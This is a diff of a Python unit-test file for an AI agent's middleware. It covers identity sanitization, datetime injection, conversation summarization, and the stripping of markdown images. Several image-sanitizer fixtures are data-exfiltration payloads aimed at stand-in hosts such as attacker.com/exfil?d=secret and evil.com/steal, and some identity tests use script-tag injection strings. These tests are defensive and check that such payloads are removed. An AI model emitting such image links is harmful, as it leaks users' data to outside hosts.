@@ -1,17 +1,24 @@
 """Unit tests for the middleware builder module."""
 
-from unittest.mock import MagicMock, patch
+from unittest.mock import AsyncMock, MagicMock, patch
 
 import pytest
 
 from deep_agent.src.agent.config.middleware import ResolvedMiddlewareConfig
 from deep_agent.src.infrastructure.middleware import (
     _build_model_fallback,
+    _build_summarization_middleware,
     _build_summarization_tool_middleware,
+    _current_user_info,
     _import_middleware,
+    _sanitize_identity_value,
+    build_current_datetime_middleware,
     build_excluded_middleware,
     build_middleware_list,
+    build_user_identity_middleware,
+    get_current_datetime,
     resolve_memory_param,
+    set_user_info,
 )
 
 
@@ -39,22 +46,52 @@ class TestBuildMiddlewareList:
         ) as mock_settings:
             mock_settings.MIDDLEWARE_ENABLED = False
             result = build_middleware_list(resolved)
-        # GeminiSafetyLogMiddleware is always included regardless of master switch
-        assert len(result) == 1
+        # GeminiSafetyLogMiddleware + UserIdentityMiddleware + CurrentDatetimeMiddleware + ImageSanitizeMiddleware always included
+        assert len(result) == 4
+        assert type(result[0]).__name__ == "GeminiSafetyLogMiddleware"
+        assert type(result[1]).__name__ == "UserIdentityMiddleware"
+        assert type(result[2]).__name__ == "CurrentDatetimeMiddleware"
+        assert type(result[3]).__name__ == "ImageSanitizeMiddleware"
+
+    @pytest.mark.parametrize("enabled", [True, False])
+    def test_automatic_compaction_independent_of_optional_middleware(self, enabled):
+        """Automatic compaction stays active when optional middleware is disabled."""
+        resolved = ResolvedMiddlewareConfig(
+            compaction_threshold=0.60, summarization_tool_enabled=False
+        )
+        model, backend, automatic = MagicMock(), MagicMock(), MagicMock()
+        with (
+            patch("deep_agent.src.infrastructure.middleware.settings") as settings,
+            patch(
+                "deep_agent.src.infrastructure.middleware._build_summarization_middleware",
+                return_value=automatic,
+            ) as build,
+        ):
+            settings.MIDDLEWARE_ENABLED = enabled
+            result = build_middleware_list(resolved, model=model, backend=backend)
+        build.assert_called_once_with(model=model, backend=backend, threshold=0.60)
+        assert result.count(automatic) == 1
 
     def test_includes_summarization_tool_when_enabled(self):
+        """The manual tool must reuse the automatic summarization engine."""
         resolved = ResolvedMiddlewareConfig(summarization_tool_enabled=True)
-        mock_mw = MagicMock()
+        automatic, manual = MagicMock(), MagicMock()
         with (
             patch("deep_agent.src.infrastructure.middleware.settings") as mock_settings,
             patch(
-                "deep_agent.src.infrastructure.middleware._build_summarization_tool_middleware",
-                return_value=mock_mw,
+                "deep_agent.src.infrastructure.middleware._build_summarization_middleware",
+                return_value=automatic,
             ),
+            patch(
+                "deep_agent.src.infrastructure.middleware._build_summarization_tool_middleware",
+                return_value=manual,
+            ) as build_tool,
         ):
             mock_settings.MIDDLEWARE_ENABLED = True
             result = build_middleware_list(resolved)
-        assert mock_mw in result
+        build_tool.assert_called_once_with(summarization=automatic)
+        assert automatic in result
+        assert manual in result
 
     def test_excludes_summarization_tool_when_disabled(self):
         resolved = ResolvedMiddlewareConfig(
@@ -69,8 +106,8 @@ class TestBuildMiddlewareList:
             mock_settings.MIDDLEWARE_ENABLED = True
             result = build_middleware_list(resolved)
             build_sum.assert_not_called()
-        # Default guardrails (model/tool limits + model retry) + safety middleware.
-        assert len(result) == 4
+        # Default guardrails (model/tool limits + model retry) + safety + identity + datetime + image sanitize.
+        assert len(result) == 7
 
     def test_includes_extra_middleware(self):
         resolved = ResolvedMiddlewareConfig(
@@ -84,7 +121,7 @@ class TestBuildMiddlewareList:
         ) as mock_settings:
             mock_settings.MIDDLEWARE_ENABLED = True
             result = build_middleware_list(resolved)
-        assert len(result) == 5
+        assert len(result) == 8
         assert any(isinstance(m, _DummyMiddleware) for m in result)
 
 
@@ -327,6 +364,489 @@ class TestGeminiSafetyLogMiddleware:
         assert mw.after_model(state, None) is None
 
 
+class TestSanitizeIdentityValue:
+    """Test _sanitize_identity_value strips dangerous characters."""
+
+    def test_normal_value_unchanged(self):
+        assert _sanitize_identity_value("alice@example.com") == "alice@example.com"
+
+    def test_strips_control_characters(self):
+        assert _sanitize_identity_value("alice\x00bob") == "alicebob"
+        assert _sanitize_identity_value("line\nnewline") == "linenewline"
+        assert _sanitize_identity_value("tab\there") == "tabhere"
+        assert _sanitize_identity_value("\x7fDEL") == "DEL"
+
+    def test_strips_delimiter_characters(self):
+        assert (
+            _sanitize_identity_value("<script>alert</script>") == "scriptalert/script"
+        )
+        assert _sanitize_identity_value("user[admin]") == "useradmin"
+
+    def test_strips_whitespace(self):
+        assert _sanitize_identity_value("  padded  ") == "padded"
+
+    def test_empty_string(self):
+        assert _sanitize_identity_value("") == ""
+
+    def test_combined_control_and_delimiter(self):
+        assert _sanitize_identity_value("\n<injected>\x00") == "injected"
+
+    def test_strips_unicode_line_separators(self):
+        assert _sanitize_identity_value("alice\u2028bob") == "alicebob"
+        assert _sanitize_identity_value("alice\u2029bob") == "alicebob"
+
+
+class TestSetUserInfo:
+    """Test set_user_info stores sanitized identity in ContextVar."""
+
+    def teardown_method(self):
+        _current_user_info.set(None)
+
+    def test_stores_sanitized_values(self):
+        set_user_info(user_id="u1", display_name="Alice", email="a@b.com")
+        info = _current_user_info.get()
+        assert info == {"user_id": "u1", "display_name": "Alice", "email": "a@b.com"}
+
+    def test_filters_none_values(self):
+        set_user_info(user_id="u1", display_name=None, email=None)
+        info = _current_user_info.get()
+        assert info == {"user_id": "u1"}
+
+    def test_all_none_sets_none(self):
+        set_user_info(user_id=None, display_name=None, email=None)
+        assert _current_user_info.get() is None
+
+    def test_sanitizes_at_storage_time(self):
+        set_user_info(user_id="u<1>", display_name="A\nB", email="a@b.com")
+        info = _current_user_info.get()
+        assert info["user_id"] == "u1"
+        assert info["display_name"] == "AB"
+
+
+class TestUserIdentityMiddleware:
+    """Test build_user_identity_middleware and its injection logic."""
+
+    def teardown_method(self):
+        _current_user_info.set(None)
+
+    def test_returns_middleware_instance(self):
+        mw = build_user_identity_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        assert type(mw).__name__ == "UserIdentityMiddleware"
+
+    def test_inject_identity_with_no_user_info(self):
+        mw = build_user_identity_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        request = MagicMock()
+        result = mw._inject_identity(request)
+        assert result is request
+        request.override.assert_not_called()
+
+    def test_inject_identity_with_user_info(self):
+        mw = build_user_identity_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        set_user_info(user_id="u1", display_name="Alice", email="a@b.com")
+        request = MagicMock()
+        request.system_message = MagicMock()
+        with patch(
+            "deepagents.middleware.subagents.append_to_system_message"
+        ) as mock_append:
+            appended_msg = MagicMock()
+            mock_append.return_value = appended_msg
+            result = mw._inject_identity(request)
+        mock_append.assert_called_once()
+        block_arg = mock_append.call_args[0][1]
+        assert "<authenticated-user>" in block_arg
+        assert "</authenticated-user>" in block_arg
+        assert "user_id: u1" in block_arg
+        assert "display_name: Alice" in block_arg
+        assert "email: a@b.com" in block_arg
+        request.override.assert_called_once_with(system_message=appended_msg)
+        assert result is request.override.return_value
+
+    def test_wrap_model_call_delegates(self):
+        mw = build_user_identity_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        handler = MagicMock()
+        request = MagicMock()
+        mw.wrap_model_call(request, handler)
+        handler.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_awrap_model_call_delegates(self):
+        mw = build_user_identity_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        handler = AsyncMock()
+        request = MagicMock()
+        await mw.awrap_model_call(request, handler)
+        handler.assert_called_once()
+
+
+class TestGetCurrentDatetime:
+    """Test get_current_datetime returns a properly formatted UTC string."""
+
+    def test_returns_string_with_utc_suffix(self):
+        result = get_current_datetime()
+        assert result.endswith(" UTC")
+
+    def test_format_matches_expected_pattern(self):
+        result = get_current_datetime()
+        # e.g. "September 25, 2026, 16:30:00 UTC"
+        import re
+
+        assert re.match(r"^[A-Z][a-z]+ \d{1,2}, \d{4}, \d{2}:\d{2}:\d{2} UTC$", result)
+
+    def test_uses_utc_not_local(self):
+        from datetime import datetime, timezone
+
+        utc_now = datetime.now(timezone.utc)
+        result = get_current_datetime()
+        # The date in the result should match UTC date
+        expected_date = utc_now.strftime("%B %d, %Y")
+        assert expected_date in result
+
+
+class TestCurrentDatetimeMiddleware:
+    """Test build_current_datetime_middleware and its injection logic."""
+
+    def test_returns_middleware_instance(self):
+        mw = build_current_datetime_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        assert type(mw).__name__ == "CurrentDatetimeMiddleware"
+
+    def test_always_injects(self):
+        mw = build_current_datetime_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        request = MagicMock()
+        request.system_message = MagicMock()
+        with patch(
+            "deepagents.middleware.subagents.append_to_system_message"
+        ) as mock_append:
+            appended_msg = MagicMock()
+            mock_append.return_value = appended_msg
+            result = mw._inject_current_datetime(request)
+        mock_append.assert_called_once()
+        block_arg = mock_append.call_args[0][1]
+        assert "<current-datetime>" in block_arg
+        assert "</current-datetime>" in block_arg
+        assert "UTC" in block_arg
+        request.override.assert_called_once_with(system_message=appended_msg)
+        assert result is request.override.return_value
+
+    def test_wrap_model_call_delegates(self):
+        mw = build_current_datetime_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        handler = MagicMock()
+        request = MagicMock()
+        mw.wrap_model_call(request, handler)
+        handler.assert_called_once()
+
+    @pytest.mark.asyncio
+    async def test_awrap_model_call_delegates(self):
+        mw = build_current_datetime_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        handler = AsyncMock()
+        request = MagicMock()
+        await mw.awrap_model_call(request, handler)
+        handler.assert_called_once()
+
+
+class TestImageSanitizeMiddleware:
+    """Test the ImageSanitizeMiddleware before_model and after_model hooks."""
+
+    def _build_middleware(self):
+        from deep_agent.src.infrastructure.middleware import (
+            _build_image_sanitize_middleware,
+        )
+
+        return _build_image_sanitize_middleware()
+
+    def test_strips_image_tag_from_ai_response(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                AIMessage(
+                    content="Here ![test](https://attacker.com/?d=secret)", id="msg1"
+                )
+            ]
+        }
+        result = mw.after_model(state, None)
+        assert result is not None
+        assert result["messages"][-1].content == "Here test"
+        assert result["messages"][-1].id == "msg1"
+
+    def test_strips_empty_alt_image_tag(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                AIMessage(
+                    content="Data ![](https://attacker.com/?d=secret) here", id="msg1"
+                )
+            ]
+        }
+        result = mw.after_model(state, None)
+        assert result is not None
+        assert result["messages"][-1].content == "Data  here"
+
+    def test_strips_multiple_image_tags(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                AIMessage(
+                    content="![a](https://evil.com/1) and ![b](https://evil.com/2)",
+                    id="msg1",
+                )
+            ]
+        }
+        result = mw.after_model(state, None)
+        assert result is not None
+        assert result["messages"][-1].content == "a and b"
+
+    def test_ignores_normal_ai_message(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {"messages": [AIMessage(content="Hello, no images here!", id="msg1")]}
+        assert mw.after_model(state, None) is None
+
+    def test_ignores_markdown_links(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                AIMessage(content="Click [here](https://example.com)", id="msg1")
+            ]
+        }
+        assert mw.after_model(state, None) is None
+
+    def test_strips_image_tag_from_user_input(self):
+        from langchain_core.messages import HumanMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                HumanMessage(
+                    content="![img](https://attacker.com/steal?d=secret)", id="msg1"
+                )
+            ]
+        }
+        result = mw.before_model(state, None)
+        assert result is not None
+        assert result["messages"][-1].content == "img"
+        assert result["messages"][-1].id == "msg1"
+
+    def test_ignores_normal_user_message(self):
+        from langchain_core.messages import HumanMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {"messages": [HumanMessage(content="What is my BMI?", id="msg1")]}
+        assert mw.before_model(state, None) is None
+
+    def test_ignores_empty_state(self):
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        assert mw.before_model({"messages": []}, None) is None
+        assert mw.after_model({"messages": []}, None) is None
+
+    def test_strips_protocol_relative_url(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [AIMessage(content="![logo](//attacker.com/steal)", id="msg1")]
+        }
+        result = mw.after_model(state, None)
+        assert result is not None
+        assert result["messages"][-1].content == "logo"
+
+    def test_strips_nested_image_tags(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                AIMessage(
+                    content="![![inner](https://decoy.com)](https://attacker.com/steal)",
+                    id="msg1",
+                )
+            ]
+        }
+        result = mw.after_model(state, None)
+        assert result is not None
+        assert "attacker" not in result["messages"][-1].content
+        assert "![" not in result["messages"][-1].content
+
+    def test_strips_image_from_tool_message(self):
+        from langchain_core.messages import ToolMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                ToolMessage(
+                    content="Result: ![chart](https://attacker.com/exfil?d=secret)",
+                    tool_call_id="tc1",
+                )
+            ]
+        }
+        result = mw.before_model(state, None)
+        assert result is not None
+        assert result["messages"][-1].content == "Result: chart"
+
+    def test_sanitizes_all_human_messages(self):
+        from langchain_core.messages import AIMessage, HumanMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                HumanMessage(content="![old](https://evil.com/1)", id="m1"),
+                AIMessage(content="Sure", id="m2"),
+                HumanMessage(content="![new](https://evil.com/2)", id="m3"),
+            ]
+        }
+        result = mw.before_model(state, None)
+        assert result is not None
+        assert result["messages"][0].content == "old"
+        assert result["messages"][2].content == "new"
+
+    def test_ignores_clean_tool_message(self):
+        from langchain_core.messages import ToolMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {"messages": [ToolMessage(content="BMI is 25.7", tool_call_id="tc1")]}
+        assert mw.before_model(state, None) is None
+
+    def test_strips_reference_style_image(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                AIMessage(
+                    content="![a][ref]\n\n[ref]: https://attacker.example/x",
+                    id="msg1",
+                )
+            ]
+        }
+        result = mw.after_model(state, None)
+        assert result is not None
+        sanitized = result["messages"][-1].content
+        assert "attacker" not in sanitized
+        assert "![a]" not in sanitized
+        assert "[ref]:" not in sanitized.lower()
+
+    def test_handles_list_content_blocks(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                AIMessage(
+                    content=[
+                        {"type": "text", "text": "![a](https://attacker.example/x)"}
+                    ],
+                    id="msg1",
+                )
+            ]
+        }
+        result = mw.after_model(state, None)
+        assert result is not None
+        assert result["messages"][-1].content == [{"type": "text", "text": "a"}]
+
+    def test_handles_string_elements_in_content_list(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        state = {
+            "messages": [
+                AIMessage(
+                    content=["![x](https://attacker.example/x)"],
+                    id="msg1",
+                )
+            ]
+        }
+        result = mw.after_model(state, None)
+        assert result is not None
+        assert result["messages"][-1].content == ["x"]
+
+    def test_preserves_link_reference_definitions(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        content = "See [docs][ref] for details.\n\n[ref]: https://example.com/docs"
+        state = {"messages": [AIMessage(content=content, id="msg1")]}
+        assert mw.after_model(state, None) is None
+
+    def test_preserves_tool_calls(self):
+        from langchain_core.messages import AIMessage
+
+        mw = self._build_middleware()
+        if mw is None:
+            pytest.skip("AgentMiddleware not available")
+        msg = AIMessage(
+            content="![x](https://evil.com/steal)",
+            id="msg1",
+            tool_calls=[{"name": "calculate_bmi", "args": {"h": 172}, "id": "tc1"}],
+        )
+        state = {"messages": [msg]}
+        result = mw.after_model(state, None)
+        assert result is not None
+        replaced = result["messages"][-1]
+        assert replaced.content == "x"
+        assert len(replaced.tool_calls) == 1
+        assert replaced.tool_calls[0]["name"] == "calculate_bmi"
+        assert replaced.tool_calls[0]["args"] == {"h": 172}
+        assert replaced.tool_calls[0]["id"] == "tc1"
+
+
 class _DummyMiddleware:
     """Test fixture — a no-op middleware class."""
 
@@ -345,23 +865,225 @@ class TestBuildModelFallbackEdgeCases:
         assert result is None
 
 
+class TestBuildAutomaticSummarization:
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize("threshold,should_compact", [(0.60, True), (0.90, False)])
+    async def test_automatic_threshold_and_history_offloading(
+        self, tmp_path, threshold, should_compact
+    ):
+        """Crossing the configured threshold archives and summarizes old history."""
+        from deepagents.backends import FilesystemBackend
+        from langchain.agents.middleware.types import ModelRequest, ModelResponse
+        from langchain_core.language_models.fake_chat_models import (
+            FakeMessagesListChatModel,
+        )
+        from langchain_core.messages import AIMessage, HumanMessage
+        from langchain_core.messages.utils import count_tokens_approximately
+
+        model = FakeMessagesListChatModel(
+            responses=[AIMessage(content="Summary of older conversation")],
+            profile={"max_input_tokens": 10000},
+        )
+        backend = FilesystemBackend(root_dir=tmp_path, virtual_mode=True)
+        middleware = _build_summarization_middleware(
+            model=model, backend=backend, threshold=threshold
+        )
+        messages = [HumanMessage(content="history " * 500, id=str(i)) for i in range(7)]
+        assert 6000 < count_tokens_approximately(messages) < 9000
+        request = ModelRequest(
+            model=model, messages=messages, state={"messages": messages}
+        )
+        handler = AsyncMock(
+            return_value=ModelResponse(result=[AIMessage(content="OK")])
+        )
+
+        response = await middleware.awrap_model_call(request, handler)
+
+        handler.assert_awaited_once()
+        archives = list((tmp_path / "conversation_history").glob("*.md"))
+        if should_compact:
+            assert len(archives) == 1
+            assert "history history" in archives[0].read_text()
+            event = response.command.update["_summarization_event"]
+            assert event["cutoff_index"] > 0
+            sent = handler.call_args.args[0].messages
+            assert "Summary of older conversation" in sent[0].content
+            assert sent[-1] == messages[-1]
+        else:
+            assert archives == []
+            assert handler.call_args.args[0].messages == messages
+
+    def test_configured_engine_replaces_deepagents_default(self, tmp_path):
+        """The configured engine replaces, rather than duplicates, the default."""
+        from deepagents import create_deep_agent
+        from deepagents.backends import FilesystemBackend
+        from langchain_core.language_models.fake_chat_models import (
+            FakeMessagesListChatModel,
+        )
+
+        model = FakeMessagesListChatModel(
+            responses=[], profile={"max_input_tokens": 10000}
+        )
+        backend = FilesystemBackend(root_dir=tmp_path, virtual_mode=True)
+        middleware = _build_summarization_middleware(
+            model=model, backend=backend, threshold=0.60
+        )
+        with patch("deepagents.graph.create_agent") as create:
+            create_deep_agent(model=model, backend=backend, middleware=[middleware])
+        summarizers = [
+            mw
+            for mw in create.call_args.kwargs["middleware"]
+            if mw.name == "SummarizationMiddleware"
+        ]
+        assert summarizers == [middleware]
+
+    @pytest.mark.parametrize("threshold", [0.50, 0.75, 0.90])
+    def test_config_passed_to_engine(self, threshold):
+        """Use configured fractions and preserve the full summary input."""
+        model, backend = MagicMock(), MagicMock()
+        model.profile = {"max_input_tokens": 10000}
+        with patch(
+            "deepagents.middleware.summarization.SummarizationMiddleware"
+        ) as engine:
+            result = _build_summarization_middleware(
+                model=model, backend=backend, threshold=threshold
+            )
+        engine.assert_called_once_with(
+            model=model,
+            backend=backend,
+            trigger=("fraction", threshold),
+            keep=("fraction", 0.10),
+            trim_tokens_to_summarize=None,
+            truncate_args_settings={
+                "trigger": ("fraction", 0.85),
+                "keep": ("fraction", 0.10),
+            },
+        )
+        assert result is engine.return_value
+
+    @pytest.mark.parametrize("profile", [None, {}, {"max_input_tokens": None}])
+    def test_missing_token_profile_uses_absolute_fallback(self, profile):
+        """Models without a usable input capacity retain Deep Agents defaults."""
+        model, backend = MagicMock(), MagicMock()
+        model.profile = profile
+        with patch(
+            "deepagents.middleware.summarization.SummarizationMiddleware"
+        ) as engine:
+            _build_summarization_middleware(
+                model=model, backend=backend, threshold=0.60
+            )
+        engine.assert_called_once_with(
+            model=model,
+            backend=backend,
+            trigger=("tokens", 170000),
+            keep=("messages", 6),
+            trim_tokens_to_summarize=None,
+            truncate_args_settings={
+                "trigger": ("messages", 20),
+                "keep": ("messages", 20),
+            },
+        )
+
+    @pytest.mark.asyncio
+    @pytest.mark.parametrize(
+        "tool_name,arg_name", [("write_file", "content"), ("edit_file", "new_string")]
+    )
+    async def test_large_old_file_arguments_are_clipped_before_model_call(
+        self, tmp_path, tool_name, arg_name
+    ):
+        """Restored argument truncation reclaims context before calling the model."""
+        from deepagents.backends import FilesystemBackend
+        from langchain.agents.middleware.types import ModelRequest, ModelResponse
+        from langchain_core.language_models.fake_chat_models import (
+            FakeMessagesListChatModel,
+        )
+        from langchain_core.messages import AIMessage, HumanMessage, ToolMessage
+
+        model = FakeMessagesListChatModel(
+            responses=[], profile={"max_input_tokens": 10000}
+        )
+        middleware = _build_summarization_middleware(
+            model=model,
+            backend=FilesystemBackend(root_dir=tmp_path, virtual_mode=True),
+            threshold=0.75,
+        )
+        old_call = AIMessage(
+            content="",
+            tool_calls=[
+                {
+                    "name": tool_name,
+                    "args": {"file_path": "/large.txt", arg_name: "x" * 40000},
+                    "id": "old-file-call",
+                }
+            ],
+        )
+        recent = HumanMessage(content="Continue with the next task.")
+        messages = [
+            old_call,
+            ToolMessage(content="Done", tool_call_id="old-file-call"),
+            recent,
+        ]
+        handler = AsyncMock(
+            return_value=ModelResponse(result=[AIMessage(content="OK")])
+        )
+
+        await middleware.awrap_model_call(
+            ModelRequest(model=model, messages=messages, state={"messages": messages}),
+            handler,
+        )
+
+        sent = handler.call_args.args[0].messages
+        assert len(sent[0].tool_calls[0]["args"][arg_name]) < 40000
+        assert sent[-1] == recent
+        assert len(old_call.tool_calls[0]["args"][arg_name]) == 40000
+
+    def test_model_without_profile_can_build_graph(self, tmp_path):
+        """A custom model with no token profile must not break graph construction."""
+        from deepagents import create_deep_agent
+        from deepagents.backends import FilesystemBackend
+        from langchain_core.language_models.fake_chat_models import (
+            FakeMessagesListChatModel,
+        )
+
+        model = FakeMessagesListChatModel(responses=[])
+        backend = FilesystemBackend(root_dir=tmp_path, virtual_mode=True)
+        automatic = _build_summarization_middleware(
+            model=model, backend=backend, threshold=0.60
+        )
+        manual = _build_summarization_tool_middleware(summarization=automatic)
+        with patch("deepagents.graph.create_agent") as create:
+            create_deep_agent(
+                model=model, backend=backend, middleware=[automatic, manual]
+            )
+        assert automatic in create.call_args.kwargs["middleware"]
+        assert manual in create.call_args.kwargs["middleware"]
+
+
 class TestBuildSummarizationToolMiddlewareEdgeCases:
     """Test edge cases for _build_summarization_tool_middleware."""
 
-    def test_none_model_returns_none(self):
-        result = _build_summarization_tool_middleware(model=None, backend=MagicMock())
+    def test_missing_engine_returns_none(self):
+        """Skip the manual tool when no summarization engine is available."""
+        result = _build_summarization_tool_middleware(summarization=None)
         assert result is None
 
-    def test_none_backend_returns_none(self):
-        result = _build_summarization_tool_middleware(model=MagicMock(), backend=None)
-        assert result is None
+    def test_shared_engine_and_conversational_instruction(self):
+        """Expose the shared engine with instructions for conversational requests."""
+        engine = MagicMock()
+        middleware = _build_summarization_tool_middleware(summarization=engine)
+        assert middleware._summarization is engine
+        assert [tool.name for tool in middleware.tools] == ["compact_conversation"]
+        assert (
+            "When the user asks to compact the conversation" in middleware.system_prompt
+        )
+        assert "call compact_conversation" in middleware.system_prompt
+        assert "nothing to compact" in middleware.system_prompt
 
     def test_exception_during_creation_returns_none(self):
+        """Optional tool construction failures must not prevent graph creation."""
         with patch(
-            "deepagents.middleware.summarization.create_summarization_tool_middleware",
+            "deepagents.middleware.summarization.SummarizationToolMiddleware",
             side_effect=Exception("creation error"),
         ):
-            result = _build_summarization_tool_middleware(
-                model=MagicMock(), backend=MagicMock()
-            )
+            result = _build_summarization_tool_middleware(summarization=MagicMock())
         assert result is None
